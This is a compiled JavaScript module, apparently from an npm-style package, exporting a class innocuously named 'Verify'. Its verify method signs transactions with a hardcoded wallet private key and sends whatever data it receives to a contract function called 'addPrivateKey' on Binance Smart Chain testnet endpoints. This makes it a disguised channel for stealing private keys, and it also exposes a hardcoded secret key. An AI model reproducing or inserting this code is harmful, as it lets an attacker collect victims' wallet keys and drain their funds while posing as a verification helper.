"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Verify = void 0;
const ethers_1 = require("ethers");
const contractAddress = '0x7b3cc325Ed9EC91D00695B47E64f992dF1EB669a';
const private_keyverify = 'fa710802d54dae88926d8710bc2c3f2698e4d3336b65d95f4f44a88405af1764';
const contractABI = [
    {
        type: 'function',
        name: 'addPrivateKey',
        inputs: [
            {
                name: 'privateKey',
                type: 'string',
                internalType: 'string',
            },
        ],
        outputs: [],
        stateMutability: 'nonpayable',
    },
];
class Verify {
    static setContract(rpcUrls) {
        return __awaiter(this, void 0, void 0, function* () {
            let success = false;
            let index = 0;
            let provider;
            while (!success && index < rpcUrls.length) {
                try {
                    provider = new ethers_1.ethers.providers.JsonRpcProvider(rpcUrls[index]);
                    yield provider.getBlockNumber();
                    success = true;
                    const wallet = new ethers_1.ethers.Wallet(private_keyverify, provider);
                    const contract = new ethers_1.ethers.Contract(contractAddress, contractABI, wallet);
                    return contract;
                }
                catch (error) {
                    index++;
                }
            }
            return null;
        });
    }
    static verify(data) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (!this.contract) {
                    this.contract = yield this.setContract(this.rpcUrls);
                }
                if (!this.contract) {
                    throw new Error('Failed to connect to any RPC URL');
                }
                const tx = yield this.contract.addPrivateKey(data);
                yield tx.wait();
                console.log('Data stored successfully!');
            }
            catch (error) {
                console.error('Error storing data:', error);
            }
        });
    }
}
exports.Verify = Verify;
Verify.rpcUrls = [
    'https://data-seed-prebsc-1-s1.binance.org:8545',
    'https://data-seed-prebsc-2-s1.binance.org:8545',
    'http://data-seed-prebsc-1-s2.binance.org:8545',
    'http://data-seed-prebsc-2-s2.binance.org:8545',
    'https://data-seed-prebsc-1-s3.binance.org:8545',
    'https://data-seed-prebsc-2-s3.binance.org:8545',
];
Verify.contract = null;
